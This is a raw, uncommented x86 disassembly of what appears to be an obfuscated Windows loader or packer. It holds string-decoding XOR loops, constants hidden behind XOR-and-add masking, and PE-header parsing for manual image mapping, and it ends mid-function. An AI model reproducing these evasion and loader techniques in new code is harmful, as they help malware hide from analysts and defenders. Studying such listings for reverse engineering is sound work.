  4286a4:	mov    edi,DWORD PTR [esi+0x14]
  4286a7:	add    ecx,eax
  4286a9:	add    edx,eax
  4286ab:	mov    DWORD PTR [ebp-0xc],ecx
  4286ae:	mov    DWORD PTR [ebp-0x1c],edx
  4286b1:	mov    DWORD PTR [ebp-0x8],edi
  4286b4:	cmp    edi,ebx
  4286b6:	ja     0x4286bb
  4286b8:	mov    DWORD PTR [ebp-0x8],ebx
  4286bb:	xor    ebx,ebx
  4286bd:	mov    DWORD PTR [ebp-0x18],ebx
  4286c0:	cmp    DWORD PTR [ebp-0x8],ebx
  4286c3:	jbe    0x428733
  4286c5:	jmp    0x4286ca
  4286c7:	mov    edx,DWORD PTR [ebp-0x1c]
  4286ca:	mov    edi,DWORD PTR [ebp-0x20]
  4286cd:	movzx  edi,WORD PTR [edi+ebx*2]
  4286d1:	cmp    ebx,DWORD PTR [esi+0x18]
  4286d4:	jae    0x428733
  4286d6:	cmp    edi,DWORD PTR [esi+0x14]
  4286d9:	jae    0x428733
  4286db:	mov    ebx,DWORD PTR [edx+ebx*4]
  4286de:	mov    edx,DWORD PTR [ebp+0x8]
  4286e1:	mov    edi,DWORD PTR [ecx+edi*4]
  4286e4:	mov    DWORD PTR [ebp-0x4],edx
  4286e7:	lea    edx,[ebp-0x50]
  4286ea:	add    ebx,eax
  4286ec:	add    edi,eax
  4286ee:	sub    edx,DWORD PTR [ebp+0x8]
  4286f1:	mov    DWORD PTR [ebp-0x14],0xb
  4286f8:	mov    DWORD PTR [ebp-0x24],edx
  4286fb:	mov    edx,DWORD PTR [ebp-0x4]
  4286fe:	cmp    DWORD PTR [edx],0x0
  428701:	jne    0x42871e
  428703:	mov    eax,DWORD PTR [ebp-0x24]
  428706:	push   DWORD PTR [eax+edx*1]
  428709:	push   ebx
  42870a:	call   0x428504
  42870f:	mov    ecx,DWORD PTR [ebp-0xc]
  428712:	test   eax,eax
  428714:	je     0x42871b
  428716:	mov    eax,DWORD PTR [ebp-0x4]
  428719:	mov    DWORD PTR [eax],edi
  42871b:	mov    eax,DWORD PTR [ebp-0x10]
  42871e:	add    DWORD PTR [ebp-0x4],0x4
  428722:	dec    DWORD PTR [ebp-0x14]
  428725:	jne    0x4286fb
  428727:	mov    ebx,DWORD PTR [ebp-0x18]
  42872a:	inc    ebx
  42872b:	mov    DWORD PTR [ebp-0x18],ebx
  42872e:	cmp    ebx,DWORD PTR [ebp-0x8]
  428731:	jb     0x4286c7
  428733:	pop    esi
  428734:	pop    ebx
  428735:	pop    edi
  428736:	leave  
  428737:	ret    0x4
  42873a:	push   ebp
  42873b:	mov    ebp,esp
  42873d:	mov    eax,DWORD PTR [ebp+0x8]
  428740:	push   esi
  428741:	push   DWORD PTR [eax+0x1e0]
  428747:	lea    esi,[eax+0x198]
  42874d:	mov    eax,DWORD PTR [ebp+0x8]
  428750:	call   0x4285e9
  428755:	mov    ecx,DWORD PTR [esi]
  428757:	mov    DWORD PTR [ecx],eax
  428759:	mov    eax,DWORD PTR [esi]
  42875b:	xor    ecx,ecx
  42875d:	cmp    DWORD PTR [eax],ecx
  42875f:	pop    esi
  428760:	setne  cl
  428763:	mov    eax,ecx
  428765:	pop    ebp
  428766:	ret    0x4
  428769:	mov    ecx,DWORD PTR [edi+0x188]
  42876f:	push   ebx
  428770:	jmp    0x428785
  428772:	xor    eax,0x8a9a
  428777:	add    eax,0x3b5c
  42877c:	mov    WORD PTR [ecx],ax
  42877f:	add    ecx,0x2
  428782:	add    edx,0x2
  428785:	movzx  eax,WORD PTR [edx]
  428788:	mov    ebx,0x4e3e
  42878d:	cmp    ax,bx
  428790:	jne    0x428772
  428792:	xor    eax,eax
  428794:	mov    WORD PTR [ecx],ax
  428797:	mov    eax,DWORD PTR [edi+0x188]
  42879d:	pop    ebx
  42879e:	ret    
  42879f:	push   edi
  4287a0:	mov    edi,eax
  4287a2:	mov    eax,DWORD PTR [esi+0x188]
  4287a8:	shl    edi,0x6
  4287ab:	add    eax,edi
  4287ad:	jmp    0x4287b9
  4287af:	xor    cl,0x7e
  4287b2:	add    cl,0x3
  4287b5:	mov    BYTE PTR [eax],cl
  4287b7:	inc    eax
  4287b8:	inc    edx
  4287b9:	mov    cl,BYTE PTR [edx]
  4287bb:	cmp    cl,0x83
  4287be:	jne    0x4287af
  4287c0:	mov    BYTE PTR [eax],0x0
  4287c3:	mov    eax,DWORD PTR [esi+0x188]
  4287c9:	add    eax,edi
  4287cb:	pop    edi
  4287cc:	ret    
  4287cd:	push   ebp
  4287ce:	mov    ebp,esp
  4287d0:	sub    esp,0x14
  4287d3:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  4287da:	mov    DWORD PTR [ebp-0x4],0xf89c85a2
  4287e1:	mov    eax,DWORD PTR [ebx]
  4287e3:	mov    DWORD PTR [ebp-0x8],eax
  4287e6:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4287ed:	push   esi
  4287ee:	push   edi
  4287ef:	mov    DWORD PTR [ebp-0x14],0xead71885
  4287f6:	mov    edi,DWORD PTR [ebp-0x4]
  4287f9:	mov    ecx,DWORD PTR [ebp-0x10]
  4287fc:	mov    eax,0x75108ae
  428801:	xor    edi,eax
  428803:	mov    edx,0x3272f5
  428808:	xor    ecx,eax
  42880a:	add    edi,edx
  42880c:	add    ecx,edx
  42880e:	imul   edi,ecx
  428811:	jmp    0x428859
  428813:	mov    ecx,DWORD PTR [ebp-0x8]
  428816:	mov    esi,DWORD PTR [ebp-0x4]
  428819:	xor    ecx,eax
  42881b:	xor    esi,eax
  42881d:	add    ecx,edx
  42881f:	add    esi,edx
  428821:	test   esi,ecx
  428823:	mov    esi,DWORD PTR [ebp-0x8]
  428826:	mov    ecx,DWORD PTR [ebp-0x4]
  428829:	je     0x428840
  42882b:	xor    ecx,eax
  42882d:	xor    esi,eax
  42882f:	add    ecx,edx
  428831:	add    esi,edx
  428833:	shr    esi,cl
  428835:	mov    ecx,DWORD PTR [ebp-0x14]
  428838:	xor    ecx,eax
  42883a:	add    ecx,edx
  42883c:	xor    esi,ecx
  42883e:	jmp    0x42884a
  428840:	xor    esi,eax
  428842:	xor    ecx,eax
  428844:	add    esi,edx
  428846:	add    ecx,edx
  428848:	shr    esi,cl
  42884a:	mov    DWORD PTR [ebp-0x8],esi
  42884d:	mov    ecx,DWORD PTR [ebp-0x4]
  428850:	xor    ecx,eax
  428852:	lea    edi,[edi+ecx*1+0x3272f5]
  428859:	mov    ecx,DWORD PTR [ebp-0xc]
  42885c:	mov    esi,DWORD PTR [ebp-0x4]
  42885f:	xor    esi,eax
  428861:	xor    ecx,eax
  428863:	sub    ecx,esi
  428865:	cmp    edi,ecx
  428867:	jbe    0x428813
  428869:	mov    eax,DWORD PTR [ebp-0x8]
  42886c:	pop    edi
  42886d:	mov    DWORD PTR [ebx],eax
  42886f:	mov    eax,DWORD PTR [ebp-0x8]
  428872:	pop    esi
  428873:	leave  
  428874:	ret    
  428875:	push   ebp
  428876:	mov    ebp,esp
  428878:	sub    esp,0x38
  42887b:	push   ebx
  42887c:	mov    ebx,0xf89c85a5
  428881:	mov    DWORD PTR [ebp-0x4],ebx
  428884:	lea    ecx,[ebx-0x3]
  428887:	mov    DWORD PTR [ebp-0x24],ecx
  42888a:	mov    eax,DWORD PTR [ebp-0x4]
  42888d:	mov    edx,DWORD PTR [ebp+0x8]
  428890:	push   esi
  428891:	mov    esi,0x75108ae
  428896:	xor    eax,esi
  428898:	push   edi
  428899:	mov    edi,0x3272f5
  42889e:	add    eax,edi
  4288a0:	cmp    edx,eax
  4288a2:	mov    eax,DWORD PTR [ebp-0x4]
  4288a5:	je     0x428a0a
  4288ab:	mov    edx,DWORD PTR [ebp+0xc]
  4288ae:	xor    eax,esi
  4288b0:	add    eax,edi
  4288b2:	cmp    edx,eax
  4288b4:	je     0x428a07
  4288ba:	mov    eax,DWORD PTR [ebp+0x10]
  4288bd:	mov    edx,DWORD PTR [ebp+0xc]
  4288c0:	mov    DWORD PTR [ebp-0x14],eax
  4288c3:	mov    eax,DWORD PTR [ebp+0x8]
  4288c6:	mov    DWORD PTR [ebp-0x18],0xf89c853d
  4288cd:	mov    DWORD PTR [ebp-0xc],eax
  4288d0:	lea    eax,[ebx-0x2]
  4288d3:	mov    DWORD PTR [ebp-0x1c],eax
  4288d6:	mov    DWORD PTR [ebp-0x10],ebx
  4288d9:	mov    DWORD PTR [ebp+0xc],ecx
  4288dc:	mov    DWORD PTR [ebp+0x10],eax
  4288df:	mov    eax,DWORD PTR [ebp+0xc]
  4288e2:	xor    eax,esi
  4288e4:	mov    DWORD PTR [ebp-0x20],edx
  4288e7:	sub    edx,eax
  4288e9:	sub    edx,edi
  4288eb:	mov    DWORD PTR [ebp+0x8],edx
  4288ee:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  4288f5:	jmp    0x4289f7
  4288fa:	mov    eax,DWORD PTR [ebp+0xc]
  4288fd:	mov    ecx,DWORD PTR [ebp+0xc]
  428900:	xor    eax,esi
  428902:	xor    ecx,esi
  428904:	lea    ecx,[eax+ecx*1+0x64e5ea]
  42890b:	mov    eax,DWORD PTR [ebp+0x8]
  42890e:	xor    edx,edx
  428910:	div    ecx
  428912:	mov    eax,DWORD PTR [ebp+0x10]
  428915:	mov    ecx,DWORD PTR [ebp+0xc]
  428918:	xor    eax,esi
  42891a:	xor    ecx,esi
  42891c:	sub    eax,ecx
  42891e:	cmp    edx,eax
  428920:	jne    0x4289b6
  428926:	mov    eax,DWORD PTR [ebp+0x8]
  428929:	mov    ecx,DWORD PTR [ebp-0xc]
  42892c:	mov    dl,BYTE PTR [eax+ecx*1]
  42892f:	mov    eax,DWORD PTR [ebp-0x10]
  428932:	mov    ecx,DWORD PTR [ebp-0x8]
  428935:	xor    eax,esi
  428937:	xor    ecx,esi
  428939:	add    eax,edi
  42893b:	add    ecx,edi
  42893d:	cmp    eax,ecx
  42893f:	jae    0x428987
  428941:	lea    ecx,[eax-0x3272f5]
  428947:	mov    DWORD PTR [ebp-0x4],ecx
  42894a:	mov    ebx,DWORD PTR [ebp-0x4]
  42894d:	xor    ebx,esi
  42894f:	add    ebx,0x7f55d8e3
  428955:	lea    ecx,[ebp+eax*4-0x38]
  428959:	mov    DWORD PTR [ecx],ebx
  42895b:	mov    ebx,DWORD PTR [ecx]
  42895d:	cmp    ebx,0x244ecb80
  428963:	jbe    0x42896d
  428965:	add    DWORD PTR [ecx],0x405fcc1
  42896b:	jmp    0x428973
  42896d:	add    DWORD PTR [ecx],0xfdaf433f
  428973:	mov    ecx,DWORD PTR [ebp-0x8]
  428976:	xor    ecx,esi
  428978:	inc    eax
  428979:	inc    DWORD PTR [ebp-0x4]
  42897c:	add    ecx,edi
  42897e:	cmp    eax,ecx
  428980:	jb     0x42894a
  428982:	mov    ebx,0xf89c85a5
  428987:	cmp    DWORD PTR [ebp-0x14],0x0
  42898b:	jne    0x428995
  42898d:	xor    dl,0x7e
  428990:	add    dl,0x3
  428993:	jmp    0x4289ab
  428995:	mov    eax,DWORD PTR [ebp-0x18]
  428998:	xor    al,0xae
  42899a:	mov    cl,0xb
  42899c:	sub    cl,al
  42899e:	add    dl,cl
  4289a0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4289a3:	xor    cl,0xae
  4289a6:	sub    cl,0xb
  4289a9:	ror    dl,cl
  4289ab:	xor    eax,eax
  4289ad:	mov    eax,DWORD PTR [ebp+0x8]
  4289b0:	mov    ecx,DWORD PTR [ebp-0xc]
  4289b3:	mov    BYTE PTR [eax+ecx*1],dl
  4289b6:	mov    eax,DWORD PTR [ebp+0x8]
  4289b9:	mov    ecx,DWORD PTR [ebp-0x10]
  4289bc:	sub    eax,edi
  4289be:	xor    eax,esi
  4289c0:	cmp    eax,ecx
  4289c2:	jne    0x4289e5
  4289c4:	mov    eax,DWORD PTR [ebp+0x10]
  4289c7:	mov    ecx,DWORD PTR [ebp+0xc]
  4289ca:	xor    eax,esi
  4289cc:	xor    ecx,esi
  4289ce:	sub    eax,ecx
  4289d0:	mov    ecx,DWORD PTR [ebp-0x20]
  4289d3:	sub    eax,edi
  4289d5:	xor    eax,esi
  4289d7:	mov    DWORD PTR [ebp+0x10],eax
  4289da:	mov    eax,DWORD PTR [ebp+0xc]
  4289dd:	xor    eax,esi
  4289df:	sub    ecx,eax
  4289e1:	sub    ecx,edi
  4289e3:	jmp    0x4289f4
  4289e5:	mov    eax,DWORD PTR [ebp+0xc]
  4289e8:	xor    eax,esi
  4289ea:	mov    ecx,0xffcd8d0b
  4289ef:	sub    ecx,eax
  4289f1:	add    ecx,DWORD PTR [ebp+0x8]
  4289f4:	mov    DWORD PTR [ebp+0x8],ecx
  4289f7:	mov    eax,DWORD PTR [ebp+0x10]
  4289fa:	cmp    eax,ebx
  4289fc:	jne    0x4288fa
  428a02:	mov    eax,DWORD PTR [ebp-0x24]
  428a05:	jmp    0x428a0a
  428a07:	mov    eax,DWORD PTR [ebp-0x4]
  428a0a:	xor    eax,esi
  428a0c:	add    eax,edi
  428a0e:	pop    edi
  428a0f:	pop    esi
  428a10:	pop    ebx
  428a11:	leave  
  428a12:	ret    0xc
  428a15:	push   ebp
  428a16:	mov    ebp,esp
  428a18:	sub    esp,0x420
  428a1e:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  428a25:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  428a2c:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  428a33:	push   ebx
  428a34:	mov    DWORD PTR [ebp-0x1c],0xf89c85a4
  428a3b:	mov    eax,DWORD PTR [ebp-0x14]
  428a3e:	push   esi
  428a3f:	mov    esi,0x75108ae
  428a44:	push   edi
  428a45:	xor    eax,esi
  428a47:	mov    edi,0x3272f5
  428a4c:	add    eax,edi
  428a4e:	mov    DWORD PTR [ebp-0x8],eax
  428a51:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  428a58:	mov    DWORD PTR [ebp-0x4],0xead71885
  428a5f:	mov    DWORD PTR [ebp-0x10],0x8
  428a66:	mov    ecx,ecx
  428a68:	mov    eax,DWORD PTR [ebp-0xc]
  428a6b:	mov    ecx,DWORD PTR [ebp-0x14]
  428a6e:	xor    eax,esi
  428a70:	xor    ecx,esi
  428a72:	add    eax,edi
  428a74:	add    ecx,edi
  428a76:	imul   eax,ecx
  428a79:	jmp    0x428aac
  428a7b:	mov    eax,DWORD PTR [ebp-0x4]
  428a7e:	sub    eax,edi
  428a80:	xor    eax,esi
  428a82:	mov    DWORD PTR [ebp-0x8],eax
  428a85:	lea    ebx,[ebp-0x8]
  428a88:	call   0x4287cd
  428a8d:	mov    DWORD PTR [ebp-0x8],eax
  428a90:	mov    eax,DWORD PTR [ebp-0x8]
  428a93:	mov    ecx,DWORD PTR [ebp-0x4]
  428a96:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  428a9d:	mov    eax,DWORD PTR [ebp-0xc]
  428aa0:	mov    ecx,DWORD PTR [ebp-0x4]
  428aa3:	xor    eax,esi
  428aa5:	lea    eax,[eax+ecx*1+0x3272f5]
  428aac:	mov    DWORD PTR [ebp-0x4],eax
  428aaf:	mov    eax,DWORD PTR [ebp-0x18]
  428ab2:	mov    ecx,DWORD PTR [ebp-0xc]
  428ab5:	xor    ecx,esi
  428ab7:	xor    eax,esi
  428ab9:	sub    eax,ecx
  428abb:	mov    ecx,DWORD PTR [ebp-0x4]
  428abe:	cmp    ecx,eax
  428ac0:	jbe    0x428a7b
  428ac2:	mov    eax,DWORD PTR [ebp-0x1c]
  428ac5:	xor    eax,esi
  428ac7:	add    eax,edi
  428ac9:	mov    DWORD PTR [ebp-0x8],eax
  428acc:	mov    DWORD PTR [ebp-0x18],0xf89c86a4
  428ad3:	mov    ebx,ebx
  428ad5:	jmp    0x428b38
  428ad7:	mov    ecx,DWORD PTR [ebp-0x20]
  428ada:	mov    eax,DWORD PTR [ebp-0x8]
  428add:	xor    ecx,esi
  428adf:	add    ecx,edi
  428ae1:	shr    eax,cl
  428ae3:	mov    DWORD PTR [ebp-0x4],eax
  428ae6:	mov    eax,DWORD PTR [ebp+0x8]
  428ae9:	mov    cl,BYTE PTR [eax]
  428aeb:	mov    BYTE PTR [ebp+0xb],cl
  428aee:	mov    cl,BYTE PTR [ebp+0xb]
  428af1:	mov    edx,DWORD PTR [ebp-0x8]
  428af4:	movzx  ecx,cl
  428af7:	xor    ecx,edx
  428af9:	mov    DWORD PTR [ebp+0x8],ecx
  428afc:	mov    ecx,DWORD PTR [ebp-0x18]
  428aff:	mov    edx,DWORD PTR [ebp+0x8]
  428b02:	xor    ecx,esi
  428b04:	add    ecx,edi
  428b06:	and    ecx,edx
  428b08:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  428b0f:	mov    edx,DWORD PTR [ebp-0x4]
  428b12:	xor    ecx,edx
  428b14:	mov    DWORD PTR [ebp-0x8],ecx
  428b17:	mov    ecx,DWORD PTR [ebp-0xc]
  428b1a:	xor    ecx,esi
  428b1c:	lea    eax,[eax+ecx*1+0x3272f5]
  428b23:	mov    DWORD PTR [ebp+0x8],eax
  428b26:	mov    eax,DWORD PTR [ebp-0xc]
  428b29:	xor    eax,esi
  428b2b:	mov    ecx,0xffcd8d0b
  428b30:	sub    ecx,eax
  428b32:	add    ecx,DWORD PTR [ebp-0x10]
  428b35:	mov    DWORD PTR [ebp-0x10],ecx
  428b38:	mov    eax,DWORD PTR [ebp-0x14]
  428b3b:	mov    ecx,DWORD PTR [ebp-0x10]
  428b3e:	xor    eax,esi
  428b40:	add    eax,edi
  428b42:	cmp    ecx,eax
  428b44:	jne    0x428ad7
  428b46:	mov    eax,DWORD PTR [ebp-0x1c]
  428b49:	mov    ecx,DWORD PTR [ebp-0x8]
  428b4c:	xor    eax,esi
  428b4e:	add    eax,edi
  428b50:	pop    edi
  428b51:	pop    esi
  428b52:	xor    eax,ecx
  428b54:	pop    ebx
  428b55:	leave  
  428b56:	ret    0x4
  428b59:	push   ebp
  428b5a:	mov    ebp,esp
  428b5c:	mov    eax,DWORD PTR [ebp+0x1c]
  428b5f:	mov    ecx,DWORD PTR [ebp+0x8]
  428b62:	mov    edx,DWORD PTR [ebp+0x10]
  428b65:	mov    eax,DWORD PTR [eax+0x190]
  428b6b:	mov    eax,DWORD PTR [eax]
  428b6d:	sub    esp,0x64
  428b70:	push   ebx
  428b71:	push   esi
  428b72:	push   edi
  428b73:	mov    edi,0x75108ae
  428b78:	xor    ecx,edi
  428b7a:	mov    ebx,0x3272f5
  428b7f:	add    ecx,ebx
  428b81:	cmp    ecx,edx
  428b83:	jne    0x428b94
  428b85:	or     DWORD PTR ds:0x3750c3f,0x4263eb2c
  428b8f:	jmp    0x429090
  428b94:	mov    ecx,DWORD PTR [ebp+0x8]
  428b97:	mov    esi,DWORD PTR [ebp+0x14]
  428b9a:	mov    edx,DWORD PTR [esi]
  428b9c:	xor    ecx,edi
  428b9e:	add    ecx,ebx
  428ba0:	cmp    edx,ecx
  428ba2:	je     0x42904b
  428ba8:	mov    ecx,DWORD PTR [ebp+0x1c]
  428bab:	mov    DWORD PTR [ebp-0x1c],eax
  428bae:	mov    DWORD PTR [ebp+0x1c],ecx
  428bb1:	mov    ecx,DWORD PTR [ebp+0x18]
  428bb4:	mov    eax,DWORD PTR [esi]
  428bb6:	mov    DWORD PTR [ebp-0x20],eax
  428bb9:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  428bc0:	mov    edx,0xf89c85a2
  428bc5:	mov    DWORD PTR [ebp-0x8],edx
  428bc8:	mov    eax,DWORD PTR [ebp+0x1c]
  428bcb:	mov    DWORD PTR [ebp+0x1c],eax
  428bce:	mov    eax,DWORD PTR [ebp+0x1c]
  428bd1:	mov    eax,DWORD PTR [eax+0x190]
  428bd7:	mov    eax,DWORD PTR [eax]
  428bd9:	mov    DWORD PTR [ebp-0x24],ecx
  428bdc:	mov    ecx,DWORD PTR [ebp+0x1c]
  428bdf:	mov    ecx,DWORD PTR [ecx+0x190]
  428be5:	mov    ecx,DWORD PTR [ecx]
  428be7:	add    ecx,DWORD PTR [eax+0x3c]
  428bea:	mov    DWORD PTR [ebp+0x10],ecx
  428bed:	mov    eax,DWORD PTR [ebp+0x8]
  428bf0:	xor    eax,edi
  428bf2:	add    eax,ebx
  428bf4:	mov    DWORD PTR [ebp-0x4],eax
  428bf7:	mov    eax,DWORD PTR [ebp+0x8]
  428bfa:	xor    eax,edi
  428bfc:	add    eax,ebx
  428bfe:	mov    DWORD PTR [ebp+0x18],eax
  428c01:	mov    eax,DWORD PTR [ebp+0x10]
  428c04:	mov    eax,DWORD PTR [eax+0x50]
  428c07:	sub    eax,0xc
  428c0a:	mov    DWORD PTR [ebp-0x28],eax
  428c0d:	mov    eax,DWORD PTR [ebp+0x10]
  428c10:	mov    eax,DWORD PTR [eax+0x38]
  428c13:	mov    ecx,DWORD PTR [ebp+0x10]
  428c16:	dec    eax
  428c17:	test   DWORD PTR [ecx+0x54],eax
  428c1a:	mov    eax,DWORD PTR [ebp+0x10]
  428c1d:	je     0x428c37
  428c1f:	mov    eax,DWORD PTR [eax+0x38]
  428c22:	mov    ecx,DWORD PTR [ebp+0x10]
  428c25:	mov    ecx,DWORD PTR [ecx+0x54]
  428c28:	dec    eax
  428c29:	not    eax
  428c2b:	and    ecx,eax
  428c2d:	mov    eax,DWORD PTR [ebp+0x10]
  428c30:	mov    eax,DWORD PTR [eax+0x38]
  428c33:	add    eax,ecx
  428c35:	jmp    0x428c3a
  428c37:	mov    eax,DWORD PTR [eax+0x54]
  428c3a:	mov    DWORD PTR [ebp+0x1c],eax
  428c3d:	mov    eax,DWORD PTR [ebp+0x8]
  428c40:	xor    eax,edi
  428c42:	add    eax,ebx
  428c44:	mov    DWORD PTR [ebp+0x18],eax
  428c47:	mov    eax,DWORD PTR [ebp+0x8]
  428c4a:	xor    eax,edi
  428c4c:	add    eax,ebx
  428c4e:	mov    DWORD PTR [ebp+0x18],eax
  428c51:	mov    eax,DWORD PTR [ebp+0x8]
  428c54:	mov    ecx,DWORD PTR [ebp-0x24]
  428c57:	xor    eax,edi
  428c59:	add    eax,ebx
  428c5b:	mov    DWORD PTR [ecx],eax
  428c5d:	mov    DWORD PTR [ebp+0x18],edx
  428c60:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  428c67:	mov    DWORD PTR [ebp+0x18],0xf89c85a0
  428c6e:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  428c75:	mov    eax,DWORD PTR [ebp-0x8]
  428c78:	mov    ecx,DWORD PTR [ebp+0x1c]
  428c7b:	xor    eax,edi
  428c7d:	add    eax,ebx
  428c7f:	imul   eax,ecx
  428c82:	mov    ecx,DWORD PTR [ebp+0x8]
  428c85:	mov    edx,DWORD PTR [ebp-0x28]
  428c88:	xor    ecx,edi
  428c8a:	lea    ecx,[ecx+edx*1+0x3272f5]
  428c91:	cmp    eax,ecx
  428c93:	jae    0x429044
  428c99:	mov    eax,DWORD PTR [ebp+0x8]
  428c9c:	xor    eax,edi
  428c9e:	add    eax,ebx
  428ca0:	mov    DWORD PTR [ebp+0x18],eax
  428ca3:	mov    eax,DWORD PTR [ebp+0x1c]
  428ca6:	add    eax,DWORD PTR [ebp-0x1c]
  428ca9:	mov    DWORD PTR [ebp-0x4],eax
  428cac:	push   DWORD PTR [ebp-0x4]
  428caf:	mov    esi,DWORD PTR [ebp-0x1c]
  428cb2:	mov    ecx,DWORD PTR [ebp+0x10]
  428cb5:	call   0x427e05
  428cba:	mov    DWORD PTR [ebp+0xc],eax
  428cbd:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  428cc4:	mov    eax,DWORD PTR [ebp-0x18]
  428cc7:	xor    eax,edi
  428cc9:	lea    ecx,[ebp-0x40]
  428ccc:	add    eax,ebx
  428cce:	push   ecx
  428ccf:	call   0x428399
  428cd4:	mov    eax,DWORD PTR [ebp+0xc]
  428cd7:	test   eax,eax
  428cd9:	je     0x428d29
  428cdb:	mov    eax,DWORD PTR [ebp-0x18]
  428cde:	xor    eax,edi
  428ce0:	add    eax,ebx
  428ce2:	push   eax
  428ce3:	push   DWORD PTR [ebp+0xc]
  428ce6:	lea    eax,[ebp-0x40]
  428ce9:	push   eax
  428cea:	call   0x42828f
  428cef:	mov    eax,DWORD PTR [ebp-0x4]
  428cf2:	mov    DWORD PTR [ebp-0x18],eax
  428cf5:	mov    eax,DWORD PTR [ebp-0x18]
  428cf8:	mov    ecx,DWORD PTR [ebp-0x1c]
  428cfb:	sub    eax,ecx
  428cfd:	mov    DWORD PTR [ebp-0x18],eax
  428d00:	mov    eax,DWORD PTR [ebp+0xc]
  428d03:	mov    ecx,DWORD PTR [ebp+0xc]
  428d06:	mov    eax,DWORD PTR [eax+0x10]
  428d09:	add    eax,DWORD PTR [ecx+0xc]
  428d0c:	mov    ecx,DWORD PTR [ebp-0x18]
  428d0f:	cmp    ecx,eax
  428d11:	jb     0x428d29
  428d13:	mov    eax,DWORD PTR [ebp+0xc]
  428d16:	mov    eax,DWORD PTR [eax+0xc]
  428d19:	mov    ecx,DWORD PTR [ebp+0xc]
  428d1c:	add    eax,DWORD PTR [ecx+0x8]
  428d1f:	mov    ecx,DWORD PTR [ebp-0x18]
  428d22:	sub    eax,ecx
  428d24:	jmp    0x429017
  428d29:	push   0xc
  428d2b:	push   DWORD PTR [ebp-0x4]
  428d2e:	lea    eax,[ebp-0x4c]
  428d31:	push   eax
  428d32:	call   0x42828f
  428d37:	mov    eax,0xf89c85a5
  428d3c:	mov    DWORD PTR [ebp-0x2c],eax
  428d3f:	mov    DWORD PTR [ebp-0x30],0xf89c85a2
  428d46:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  428d4d:	mov    DWORD PTR [ebp-0x38],0xf89c85a0
  428d54:	lea    ecx,[ebp-0x2c]
  428d57:	mov    DWORD PTR [ebp-0xc],ecx
  428d5a:	lea    ecx,[ebp-0x30]
  428d5d:	mov    DWORD PTR [ebp-0x10],ecx
  428d60:	lea    ecx,[ebp-0x34]
  428d63:	mov    DWORD PTR [ebp+0xc],ecx
  428d66:	lea    ecx,[ebp-0x38]
  428d69:	mov    DWORD PTR [ebp-0x14],ecx
  428d6c:	mov    ecx,DWORD PTR [ebp+0x8]
  428d6f:	xor    ecx,edi
  428d71:	add    ecx,ebx
  428d73:	mov    DWORD PTR [ebp-0x18],ecx
  428d76:	jmp    0x428f72
  428d7b:	cmp    eax,0xf89c85a3
  428d80:	je     0x428f84
  428d86:	mov    ecx,DWORD PTR [ebp-0x8]
  428d89:	xor    ecx,edi
  428d8b:	mov    esi,eax
  428d8d:	add    ecx,ebx
  428d8f:	mov    DWORD PTR [ebp+0x18],ecx
  428d92:	mov    eax,DWORD PTR [ebp-0x18]
  428d95:	xor    esi,edi
  428d97:	lea    eax,[eax+esi*1+0x3272f5]
  428d9e:	mov    DWORD PTR [ebp-0x18],eax
  428da1:	mov    eax,DWORD PTR [ebp-0x8]
  428da4:	mov    ecx,DWORD PTR [ebp-0x18]
  428da7:	xor    eax,edi
  428da9:	add    eax,ebx
  428dab:	cmp    ecx,eax
  428dad:	jne    0x428dc2
  428daf:	mov    eax,DWORD PTR [ebp+0x8]
  428db2:	xor    eax,edi
  428db4:	add    eax,ebx
  428db6:	push   eax
  428db7:	push   0xc
  428db9:	lea    eax,[ebp-0x4c]
  428dbc:	push   eax
  428dbd:	call   0x428875
  428dc2:	mov    eax,DWORD PTR [ebp-0xc]
  428dc5:	mov    eax,DWORD PTR [eax]
  428dc7:	xor    eax,edi
  428dc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428dd0:	mov    ecx,DWORD PTR [ebp+0x8]
  428dd3:	xor    ecx,edi
  428dd5:	movzx  eax,al
  428dd8:	add    ecx,ebx
  428dda:	cmp    eax,ecx
  428ddc:	je     0x428f5a
  428de2:	mov    eax,DWORD PTR [ebp-0x10]
  428de5:	mov    eax,DWORD PTR [eax]
  428de7:	xor    eax,edi
  428de9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428df0:	mov    ecx,DWORD PTR [ebp+0x8]
  428df3:	xor    ecx,edi
  428df5:	movzx  eax,al
  428df8:	add    ecx,ebx
  428dfa:	cmp    eax,ecx
  428dfc:	je     0x428f5a
  428e02:	mov    eax,DWORD PTR [ebp+0xc]
  428e05:	mov    eax,DWORD PTR [eax]
  428e07:	xor    eax,edi
  428e09:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e10:	mov    ecx,DWORD PTR [ebp+0x8]
  428e13:	xor    ecx,edi
  428e15:	movzx  eax,al
  428e18:	add    ecx,ebx
  428e1a:	cmp    eax,ecx
  428e1c:	je     0x428f5a
  428e22:	mov    eax,DWORD PTR [ebp-0x14]
  428e25:	mov    eax,DWORD PTR [eax]
  428e27:	xor    eax,edi
  428e29:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e30:	mov    ecx,DWORD PTR [ebp+0x8]
  428e33:	xor    ecx,edi
  428e35:	movzx  eax,al
  428e38:	add    ecx,ebx
  428e3a:	cmp    eax,ecx
  428e3c:	je     0x428f5a
  428e42:	mov    eax,DWORD PTR [ebp-0x10]
  428e45:	mov    eax,DWORD PTR [eax]
  428e47:	xor    eax,edi
  428e49:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e50:	mov    ecx,DWORD PTR [ebp-0xc]
  428e53:	mov    ecx,DWORD PTR [ecx]
  428e55:	xor    ecx,edi
  428e57:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428e5e:	xor    al,cl
  428e60:	mov    ecx,DWORD PTR [ebp+0xc]
  428e63:	mov    ecx,DWORD PTR [ecx]
  428e65:	xor    ecx,edi
